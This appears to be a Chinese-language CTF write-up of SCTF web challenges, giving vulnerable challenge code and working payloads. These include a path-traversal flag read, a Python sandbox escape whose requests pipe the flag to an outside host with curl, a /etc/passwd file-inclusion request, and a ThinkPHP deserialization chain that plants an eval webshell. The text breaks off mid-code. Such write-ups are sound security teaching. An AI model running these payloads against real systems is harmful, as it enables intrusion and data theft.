<h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>,<span class="string">&quot;IndexController@init&quot;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/rm&#x27;</span>,<span class="string">&quot;IndexController@rm&quot;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/tmp/&#123;filename&#125;&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    readfile(<span class="string">&quot;./var/tmp/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">&#125;)-&gt;where(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/upload&#x27;</span>,<span class="string">&quot;IndexController@upload&quot;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/move/log/&#123;filename&#125;&#x27;</span>, <span class="string">&#x27;IndexController@moveLog&#x27;</span>)-&gt;where(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] !== <span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; strpos(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],<span class="string">&quot;192.168.&quot;</span>) !== <span class="number">0</span> &amp;&amp; strpos(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],<span class="string">&quot;10.&quot;</span>) !== <span class="number">0</span> )  &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;admin only&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>])))&#123;</span><br><span class="line">            mkdir(<span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rm</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>], <span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">                rmdir(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;rmdir&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                unlink(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;unlink&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>], <span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>],base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>]));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveLog</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> =date(<span class="string">&quot;Y-m-d&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>))&#123;</span><br><span class="line">            mkdir(storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$opts</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;method&#x27;</span>=&gt;<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;timeout&#x27;</span>=&gt;<span class="number">1</span>,<span class="comment">//单位秒</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="string">&quot;http://127.0.0.1/tmp/&quot;</span>.md5(<span class="string">&#x27;127.0.0.1&#x27;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>,<span class="literal">false</span>,stream_context_create(<span class="variable">$opts</span>));</span><br><span class="line">        file_put_contents(storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>storage_path(“logs”):/var/www/html/storage/logs</p>
<p>upload dir : /var/tmp/md5(IP)/</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/tmp/&#123;filename&#125;&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    readfile(<span class="string">&quot;./var/tmp/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">&#125;)-&gt;where(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>直接任意文件读取，但是因为两个../服务器不会解析直接报错的原因无法穿到根目录，后来想到在弄个index.php就好了<br>最后的payload:<a target="_blank" rel="noopener" href="http://39.104.93.188/flag">http://39.104.93.188/index.php/tmp/../../flag</a></p>
<p>SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1}</p>
<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><h3 id="pysandbox1"><a href="#pysandbox1" class="headerlink" title="pysandbox1"></a>pysandbox1</h3><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security</span>():</span></span><br><span class="line">    secret = request.form[<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= <span class="built_in">ord</span>(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exec</span>(secret)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xXXxXXx&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试环境：<a target="_blank" rel="noopener" href="http://ccreater.top:60011/">http://ccreater.top:60011/</a><br>禁用字符：</p>
<p><code>[&quot;\u0000&quot;, &quot;\u0001&quot;, &quot;\u0002&quot;, &quot;\u0003&quot;, &quot;\u0004&quot;, &quot;\u0005&quot;, &quot;\u0006&quot;, &quot;\u0007&quot;, &quot;\b&quot;, &quot;\t&quot;, &quot;\n&quot;, &quot;\u000b&quot;, &quot;\f&quot;, &quot;\r&quot;, &quot;\u000e&quot;, &quot;\u000f&quot;, &quot;\u0010&quot;, &quot;\u0011&quot;, &quot;\u0012&quot;, &quot;\u0013&quot;, &quot;\u0014&quot;, &quot;\u0015&quot;, &quot;\u0016&quot;, &quot;\u0017&quot;, &quot;\u0018&quot;, &quot;\u0019&quot;, &quot;\u001a&quot;, &quot;\u001b&quot;, &quot;\u001c&quot;, &quot;\u001d&quot;, &quot;\u001e&quot;, &quot;\u001f&quot;, &quot; &quot;, &quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;&#123;&quot;, &quot;|&quot;, &quot;&#125;&quot;, &quot;~&quot;, &quot;\u007f&quot;]</code></p>
<p>利用魔术方法? : <code>__getitem__,__getattr__</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=__import__(&#x27;os&#x27;).system(&#x27;curl+http%3a//ccreater.top%3a60000/+-d+`cat+flag|base64`&#x27;) HTTP/1.1</span><br><span class="line">Host: 39.104.90.30:10006</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://39.104.90.30:10006/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Disposition: form-data; name=&quot;cmd&quot;</span><br><span class="line"></span><br><span class="line">request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;</span><br><span class="line">------WebKitFormBoundaryx3B8HB5b--</span><br></pre></td></tr></table></figure>

<h3 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h3><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=__import__(&#x27;os&#x27;).system(&#x27;curl+http%3a//ccreater.top%3a60000/+-d+`/readflag|base64`&#x27;) HTTP/1.1</span><br><span class="line">Host: 39.104.90.30:10006</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://39.104.90.30:10006/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Disposition: form-data; name=&quot;cmd&quot;</span><br><span class="line"></span><br><span class="line">request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;</span><br><span class="line">------WebKitFormBoundaryx3B8HB5b--</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="为何payload能运行"><a href="#为何payload能运行" class="headerlink" title="为何payload能运行"></a>为何payload能运行</h3><p>我们都知道python 调用类方法的时候会传入<code>self</code>参数，而我们调用<code>app.config==request.args.a</code>应该也会传入self参数，那么为什么这个payload可以成功</p>
<p>测试代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>():</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line">a = A()</span><br><span class="line">a.__class__.__eq__=<span class="built_in">eval</span></span><br><span class="line">a==<span class="string">&quot;print(123)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>我们跟进python底层看看</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165243.png" alt="image13796"></p>
<p>这里显示nargs显示只有1个参数，参看堆栈，跟踪到最开始的地方</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165459.png" alt="image13916"></p>
<p>这里我们确实传入了self,其中v是<code>self</code>,w是<code>print(123)</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165709.png" alt="image14041"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165753.png" alt="image14125"></p>
<p>在<code>call_unbound</code>处我们发现了原因，是因为ubound==0</p>
<p>在<code>lookup_maybe_method</code>中设置了ubound的值</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708170013.png" alt="image14285"></p>
<p><code>#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</code></p>
<blockquote>
<p>The difference between bound and unbound is the value of the <code>.__self__</code> attribute (None when unbound). </p>
</blockquote>
<h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image14584"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://39.99.41.124/public/log.txt</span><br><span class="line">http://39.99.41.124/public/test/</span><br><span class="line">http://39.99.41.124/public/nationalsb/login.php</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在<a target="_blank" rel="noopener" href="http://39.99.41.124/public/nationalsb/js/script.js%E4%B8%AD%E5%8F%91%E7%8E%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%9A">http://39.99.41.124/public/nationalsb/js/script.js中发现账号密码：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//username:Admin1964752</span><br><span class="line">//password:DsaPPPP!@#amspe1221</span><br><span class="line">//Secret **** is your birthday</span><br></pre></td></tr></table></figure>

<p>文件包含:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/nationalsb/login.php HTTP/1.1</span><br><span class="line">Host: 39.99.41.124</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">file=/etc/passwd</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Warning&lt;/b&gt;:  include(): Failed opening &#x27;php://filter/read=convert.base64-encode/resource=index.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in &lt;b&gt;/var/www/html/public/nationalsb/login.php</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /public/index.php?s=/index/Index/hello&amp;s3cr3tk3y= HTTP/1.1</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Host: 39.99.41.124</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> \<span class="title">think</span>\<span class="title">Controller</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  	<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Warning&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You IP: &quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot; has been recorded by the National Security Bureau.I will record it to ./log.txt, Please pay attention to your behavior&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1/public/test&quot;&gt;&#x27;</span>;  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  	unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;s3cr3tk3y&#x27;</span>]));</span><br><span class="line">    <span class="keyword">echo</span>(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;s3cr3tk3y&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>/var/www/html/protect.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;cjbtest&#x27;</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">	    <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">	    <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#x27;</span>, <span class="comment">// 因为 static 目录有写权限</span></span><br><span class="line">	    <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span></span><br><span class="line">	];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;handler=<span class="keyword">new</span> File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 